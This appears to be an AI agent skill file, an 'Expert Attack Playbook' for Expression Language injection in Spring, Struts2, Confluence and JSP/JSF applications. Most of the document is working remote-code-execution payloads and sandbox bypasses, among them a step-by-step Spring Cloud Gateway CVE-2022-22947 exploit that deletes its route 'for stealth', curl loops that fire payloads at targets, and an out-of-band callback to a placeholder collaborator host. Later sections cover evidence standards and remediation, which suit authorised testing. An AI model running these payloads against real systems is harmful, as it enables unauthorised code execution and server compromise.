---
name: expression-language-injection
description: >-
  Expression Language injection playbook. Use when Java EL, SpEL, OGNL, or MVEL expressions may evaluate attacker-controlled input in Spring, Struts2, Confluence, or similar frameworks.
---

# SKILL: Expression Language Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert EL injection techniques covering SpEL (Spring), OGNL (Struts2), and Java EL (JSP/JSF). Distinct from SSTI — EL injection targets expression evaluators in Java frameworks, not template engines. Covers sandbox bypass, `_memberAccess` manipulation, actuator abuse, and real-world CVE chains.

## 0. RELATED ROUTING

- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) for template engines (Jinja2, FreeMarker, Twig) — different attack surface
- [jndi-injection](../jndi-injection/SKILL.md) when EL evaluation leads to JNDI lookup

**Key distinction**: SSTI targets template rendering engines; EL injection targets expression evaluators embedded in Java frameworks. They share detection probes (`${7*7}`) but diverge in exploitation.

---

## 1. DETECTION — POLYGLOT PROBES

```text
${7*7}              → 49 = SpEL, OGNL, or Java EL
#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
%{7*7}              → 49 = OGNL (Struts2)
${T(java.lang.Math).random()}  → random float = SpEL confirmed
%{#context}         → object dump = OGNL confirmed
```

### Disambiguation

| Response to `${7*7}` | Response to `%{7*7}` | Engine |
|---|---|---|
| 49 | literal `%{7*7}` | SpEL or Java EL |
| literal `${7*7}` | 49 | OGNL (Struts2) |
| 49 | 49 | Both may be active |

---

## 2. SpEL (SPRING EXPRESSION LANGUAGE)

### Where SpEL Appears

- `@Value("${...}")` annotations
- Spring Security expressions (`@PreAuthorize`)
- Spring Cloud Gateway route predicates and filters
- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
- Spring Data `@Query` with SpEL

### RCE via Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE with Output Capture (Commons IO)

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE with Output Capture (Spring StreamUtils)

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder (alternative when Runtime is blocked)

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

Exploit via actuator to add malicious route with SpEL filter:

```text
# Step 1: Add route with SpEL in filter (with output capture)
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# Step 2: Refresh routes to apply
POST /actuator/gateway/refresh

# Step 3: Trigger the route
GET /hackpath
# Response header "Result" contains command output

# Step 4: Clean up (important for stealth)
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL Sandbox Bypass

When `SimpleEvaluationContext` is used (restricts `T()` operator):

```java
// Try reflection-based bypass:
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)

### Where OGNL Appears

- Apache Struts2 — primary OGNL consumer
- Confluence Server — uses OGNL in certain request paths
- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`

### Basic RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 Sandbox Bypass — _memberAccess Manipulation

Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Struts2 OgnlUtil Blacklist Clear

Later Struts2 versions use class/package blacklists. Bypass by clearing `excludedClasses` and `excludedPackageNames`:

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### Key Struts2 CVEs

| CVE | Vector | Payload Location |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |

### Confluence OGNL — CVE-2021-26084

Confluence Server allows OGNL injection via the `queryString` or action parameters:

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL-decoded: \u0027+{3*3}+\u0027
# If response contains 9 → confirmed
# Escalate to Runtime.exec for RCE
```

---

## 4. JAVA EL (JSP / JSF)

### Where Java EL Appears

- JSP pages: `${expression}` and `#{expression}`
- JSF (JavaServer Faces): value and method bindings
- Custom tag libraries

### RCE Payloads

```java
// Java EL with Runtime:
${Runtime.getRuntime().exec("id")}

// Via pageContext (JSP):
${pageContext.request.getServletContext().getClassLoader()}

// Reflection-based:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 5. DETECTION METHODOLOGY

```
Input reflected and ${7*7} returns 49?
├── Java application?
│   ├── Struts2? → Try %{...} OGNL payloads
│   │   └── Check Content-Type injection (S2-045)
│   ├── Spring? → Try T(java.lang.Runtime) SpEL
│   │   └── Check /actuator/gateway (Spring Cloud Gateway)
│   ├── Confluence? → Try OGNL via action parameters
│   └── JSP/JSF? → Try Java EL payloads
│
├── Error messages reveal framework?
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── Blocked by sandbox?
    ├── OGNL: clear _memberAccess / excludedClasses
    ├── SpEL: reflection bypass for SimpleEvaluationContext
    └── Try alternative exec methods (ProcessBuilder, ScriptEngine)
```

---

## 6. QUICK REFERENCE

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL with sandbox bypass:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 probe:
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```

---

## 7. EXECUTION PRIMITIVES

Expression injection is proven by **evaluation with observable output**. SpEL, OGNL, and Java EL each
have a different syntax and a different reachable capability - identify the language before attempting
a chain.

### 7.1 The language-discrimination probe set

```bash
# each of these is valid in one language family and inert in the others
for P in \
  '7*7' '${7*7}' '#{7*7}' '%{7*7}' '#{7*7}' '${7*"7"}' \
  'T(java.lang.Math).abs(-1)' \
  '%{2*2}' '%{2*3}' \
  '7*7}"' "'7*7'" ; do
  R=$(curl -sS --get --data-urlencode "q=$P" "https://target.tld/search" -o /tmp/e; grep -oE '\b(49|14|77|1)\b' /tmp/e | sort -u | tr '\n' ' ')
  printf '%-34s status=%s hits=%s\n' "$P" "$(curl -sS -o /dev/null -w '%{http_code}' --get --data-urlencode "q=$P" "https://target.tld/search")" "$R"
done
```

`${7*7}` evaluating to `49` is SpEL or Java EL; `%{7*7}` is OGNL in Struts or Java EL in some
containers; `#{7*7}` is Java EL in a JSF/JSP context. **Record the syntax and the evaluated output**;
the language decides which chain is possible.

### 7.2 SpEL: from evaluation to output

```bash
# SpEL can return a value, so command output is retrievable in one expression
for P in \
  '${7*7}' \
  '${T(java.lang.Runtime).getRuntime().exec("id")}' \
  '${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}' ; do
  echo "=== $P"
  curl -sS --get --data-urlencode "q=$P" "https://target.tld/search" | head -c 300; echo
done
```

The third form **returns the command's stdout** as a string rather than a `Process` object - that is
the difference between proving execution and proving output. Try both; the `Scanner` form is the one
that produces a printable result.

### 7.3 SpEL with restricted type access

```bash
# when T() is blocked, the class loader and reflection paths are the alternates
for P in \
  '${"".getClass().forName("java.lang.Runtime")}' \
  '${"".getClass().forName("java.lang.Runtime").getMethod("exec", "".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null), "id")}' \
  '${#{T(java.lang.Runtime)}}' \
  '${T(java.lang.ProcessBuilder)}' ; do
  echo "=== $P"
  curl -sS --get --data-urlencode "q=$P" "https://target.tld/search" | head -c 250; echo
done
```

`T()` is a syntactic sugar for a type reference; blocking it while leaving reflection available is a
common half-fix. **Test the reflection path explicitly** before concluding the context is restricted.

### 7.4 OGNL: the Struts chain

```bash
# OGNL uses @ for static access and # for context variables
for P in \
  '%{7*7}' \
  '%{@java.lang.Runtime@getRuntime().exec("id")}' \
  '%{@java.lang.Runtime@getRuntime().exec("id").getInputStream()}' \
  '%{(#cmd="id")(#is=new java.io.BufferedReader(new java.io.InputStreamReader(@java.lang.Runtime@getRuntime().exec(#cmd).getInputStream())))(#lines=new java.util.ArrayList())(#line=#is.readLine())(#lines.add(#line))(#lines.toString())}' ; do
  echo "=== $P"
  curl -sS --get --data-urlencode "q=$P" "https://target.tld/" | head -c 300; echo
done
```

OGNL's static accessor syntax `@class@method()` is the equivalent of SpEL's `T()`. The long form above
reads the process output through `BufferedReader` - **use it when the short form returns only an
object reference**.

### 7.5 Java EL / EL injection in containers

```bash
# EL in a JSP/JSF/Spring-MVC parameter, and the classic EL injection via a double evaluation
for P in \
  '${7*7}' \
  '${pageContext.request.contextPath}' \
  '${"".getClass().forName("javax.script.ScriptEngineManager")}' \
  '${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("7*7")}' ; do
  echo "=== $P"
  curl -sS --get --data-urlencode "q=$P" "https://target.tld/app" | head -c 250; echo
done
# the double-evaluation injection: the app evaluates your value as an EL expression
curl -sS --get --data-urlencode 'q=${"".getClass().forName("java.lang.Runtime")}' "https://target.tld/app" | head -c 250
```

Container EL is often restricted to a getter-only context, in which case the **script-engine path**
(creating a JS engine and evaluating code in it) is the route to execution. If the container blocks
class access entirely, report the expression evaluation as an information-disclosure finding.

### 7.6 Build the incremental proof ladder

```bash
echo "step 1 - arithmetic"; curl -sS --get --data-urlencode "q=\${7*7}" "https://target.tld/search" | grep -oE '\b49\b' | head -1
echo "step 2 - property read"; curl -sS --get --data-urlencode 'q=${pageContext.request.serverName}' "https://target.tld/app" | head -c 80; echo
echo "step 3 - static class access"; curl -sS --get --data-urlencode 'q=${T(java.lang.Runtime)}' "https://target.tld/search" | head -c 120; echo
echo "step 4 - object creation"; curl -sS --get --data-urlencode 'q=${"".getClass().forName("java.lang.Runtime")}' "https://target.tld/search" | head -c 120; echo
echo "step 5 - command"; curl -sS --get --data-urlencode 'q=${T(java.lang.Runtime).getRuntime().exec("id")}' "https://target.tld/search" | head -c 120; echo
```

Each rung is a separate, reportable capability. **Report the highest rung you actually reached** -
step 1 and 2 are information disclosure, steps 3-4 are a restricted-context escape, step 5 is
execution. Reporting step 5 from a response to step 3 is the most common over-claim in this class.

### 7.7 Blind evaluation and the timing oracle

```bash
B=$(curl -sS -o /dev/null -w '%{time_total}' --get --data-urlencode "q=x" "https://target.tld/search")
for P in '${7*7}' '${T(java.lang.Thread).sleep(5000)}' '${T(java.lang.Thread).sleep(10000)}'; do
  T=$(curl -sS -o /dev/null -w '%{time_total}' --get --data-urlencode "q=$P" "https://target.tld/search")
  echo "$P -> ${T}s (baseline ${B}s)"
done
```

A doubling sleep proves evaluation where nothing is reflected. **Keep sleeps short** (5s, 10s) - a
blind oracle does not need a long delay, and a long one looks like a denial of service.

### 7.8 Out-of-band: force a network call from the expression

```bash
# SpEL spawning a shell that calls back - the strongest blind proof
curl -sS --get --data-urlencode "q=\${T(java.lang.Runtime).getRuntime().exec(new String[]{\"curl\",\"http://COLLAB/el-eval\"})}" \
  "https://target.tld/search" -o /dev/null
sleep 6; grep -c 'el-eval' /path/to/collab.log
# and the pure-Java variant, when no shell is available
curl -sS --get --data-urlencode "q=\${new java.net.URL(\"http://COLLAB/el-net\").openStream()}" "https://target.tld/search" -o /dev/null
sleep 6; grep -c 'el-net' /path/to/collab.log
```

The pure-Java `URL().openStream()` form proves expression evaluation **and** outbound reach without
needing a shell or an executable - it is often the cleanest proof available.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the expression **evaluate** to a computed value, not reflect? | injection versus reflection |
| 2 | Which **language** is it (SpEL, OGNL, EL)? | determines the chain, the fix, and the report's audience |
| 3 | Which **rung of the ladder** did you reach - arithmetic, property, class access, execution? | the capability you may claim |
| 4 | Did you get **command output** (`uid=`) or only an object reference? | the difference between execution and execution-with-output |
| 5 | Is the evaluation **server-side and reachable** from a delivery path a user can follow? | reachability |
| 6 | For blind contexts, is there a **measured timing delta or an OOB callback**? | the only available proof when nothing reflects |
| 7 | Did the context allow **type and class access**, or was it restricted? | determines whether this is RCE or restricted evaluation |

**Report the rung.** Arithmetic evaluation is a finding; class access is a stronger one; command output
is RCE. Claiming a higher rung than your evidence supports is the failure mode in this domain.

---

## 9. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **exact expression** and the **injection point** | the reproduction, and the fix target |
| The **language identified**, with the probe that identified it | SpEL, OGNL, and EL have different remediations |
| The **rung reached**, with the response showing the computed value or the command output | the capability claim must match the evidence |
| The **response body** containing the evaluated result, or the **timing delta**, or the **OOB callback** | proves evaluation in full, blind, and semi-blind contexts |
| The **restrictions observed** (`T()` blocked, reflection allowed, script engine available) | explains which chain was needed and what the fix must cover |
| The **server-side proof** - a request you sent directly, not a browser-driven one | distinguishes server evaluation from client-side |
| **Negative control** - a non-expression string in the same parameter is not evaluated | rules out a page that always computes |
| The **framework and version** where identifiable | EL and OGNL behaviour is version-dependent |
| Confirmation the command was **read-only** (`id`, `hostname`) | scope discipline |
| A statement of what was **not** reached - no file write, no persistence | honest scoping |

Report the **expression and the rung**: "the `q` parameter on `/search` is evaluated as a SpEL
expression; `${7*7}` returned `49`, `${T(java.lang.Runtime)}` returned a `Class` reference, and
`${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}`
returned `uid=1001(app) gid=1001(app)`; the `Client` header identifies Spring Boot 2.6.3, whose SpEL
evaluation of request parameters is the mechanism", never "the application has expression injection".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| The expression is reflected verbatim | no evaluation |
| `${7*7}` reflected but `#{7*7}` evaluates | report only the working syntax |
| A `500` or an error message naming the language | an exception is not evaluation |
| The value is evaluated only in a browser | client-side; a different finding |
| Class access reached but no execution | report the rung you reached, not RCE |
| A `Process[pid=...]` object with no readable output | execution happened; state it without claiming output |
| A timing difference caused by a slow endpoint rather than the sleep | measure a baseline |
| An expression you could only send by editing the request in a proxy with no user-reachable path | not reachable |
| A language identified from an error string, with no successful evaluation | fingerprinting, not injection |
| A restricted context where every chain failed | the restriction held |
| A command run in your own test harness | tests your harness |
| An EL injection into a field the application never evaluates | no sink |

**Climb the ladder and report your rung.** Every over-claim in this class comes from skipping the
step between arithmetic and execution.

---

## 10. REMEDIATION REFERENCE

1. **Never evaluate user input as an expression** - the fix is architectural: expressions come from configuration or code, never from a request parameter.
2. **Do not expose `T()`, static access, or reflection in the evaluation context** - SpEL's `StandardEvaluationContext` should be replaced with a restricted context, and `SimpleEvaluationContext` used wherever possible.
3. **Use `SimpleEvaluationContext` for SpEL** - it removes type references and method invocation on arbitrary classes, which is exactly what turns evaluation into execution.
4. **Keep OGNL and EL out of user-controllable paths** - both languages have full reflection by design; if a feature needs expression input, implement a constrained parser instead of using the general-purpose language.
5. **Upgrade the frameworks whose EL injection was a CVE** - many container and MVC EL injections are patched library versions, so the version is often the whole finding.
6. **Validate and allowlist parameter values** - a parameter that should be an identifier, a number, or one of a fixed set should never be free text, and the schema is the cheapest control.
7. **Remove the `javax.script` bridge from reachable contexts** - the script-engine path converts an EL evaluation into arbitrary code and is rarely needed.
8. **Run the application with least privilege** - a SpEL RCE in a process with no shell and no writable filesystem is materially less severe; least privilege is the containment.
9. **Egress-filter the application network** - it blocks the OOB confirmation and the payload's own callback, and it caps the utility of an evaluation primitive you have not yet found.
10. **Never return framework error details to users** - error messages identify the language and the version and turn fingerprinting into a two-request exercise.
11. **Add an automated test that asserts a known expression payload is inert** - one assertion per parameter detects this class and any regression introduced by a framework upgrade.

---

## 11. RELATED SIBLINGS - LOAD TOGETHER

- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) - the template-engine half of the same class
- [jndi-injection](../jndi-injection/SKILL.md) - the Java lookup family from the same ecosystem
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) - the sink an expression chain reaches
- [deserialization-insecure](../deserialization-insecure/SKILL.md) - the neighbouring Java object-to-code path
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) - what a Java-process compromise typically reaches
